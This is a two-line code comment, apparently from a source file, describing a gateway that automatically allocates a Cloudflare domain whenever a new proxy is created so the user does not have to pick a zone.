     // Auto-allocate a Cloudflare domain when a new proxy is created, so the
     // user doesn't have to manually pick a zone — the gateway handles it.
